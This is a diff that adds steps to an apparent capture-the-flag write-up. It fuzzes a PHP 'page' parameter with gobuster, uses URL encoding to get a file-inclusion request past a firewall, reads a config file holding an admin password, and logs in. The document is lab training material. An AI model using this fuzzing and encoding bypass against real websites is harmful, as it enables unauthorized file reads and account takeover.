@@ -165,23 +165,50 @@ THM{REDACTED}
 ---
 
 ### 8. Parameter Fuzzing – LFI
+At the beginning of the challenge we found in de /logs file some information about the admin:
+- Failed to parse admin_info in /var/www/html/config/app.conf
+But the firewall is ofcourse still blocking config/app.conf
+
+So i went looking around and found live.php?page=match.php what could be interesting. 
+
+I tries to fuzz the page parameter to find hidden files or directories.
+
 ```bash
 gobuster fuzz -u http://10.67.171.240/live.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -a Mozilla/5.0 --exclude-length 1907
 ```
+**Results:**
+| Path           | Status | Notes         |
+| -------------- | ------ | ------------- |
+| /config        | 301    | Interesting   |
+| /logs          | 301    | Contains logs |
+| /css           | 301    | Bootstrap     |
+| /js            | 301    | Bootstrap     |
+| /index.php     | 200    | Homepage      |
+| /php.ini       | 403    | Blocked       |
+| /server-status | 403    | Blocked       |
+
+again i found /config and /logs. This time im trying this http://10.67.171.240/live.php?page=/config/app.conf because there is maybe some information about the admin creds. But as expected teh firewall blockes me. Thats the moment im rememberig about encoding techniques and tries URL Encoding.
 
 ---
 
 ### 9. URL Encoding WAF Bypass
+I go to cyberchef and let this /config/app.conf url encoded to %2Fconfig%2Fapp%2Econf. 
+I fill it in the url balk and it worked.
 ```bash
 /live.php?page=%2Fconfig%2Fapp%2Econf
 ```
+**Found some admin information**
 ```ini
 admin_info = "bL}8,S9W1o44"
 ```
+explanation why it works and how it works?
 
 ---
 
 ### 10. Admin Access
+I go tot the login page with the username admin and password bL}8,S9W1o44 to retrive the final flag.
+
+**What is the flag value after logging in as admin?**
 ```
 THM{REDACTED}
 ```
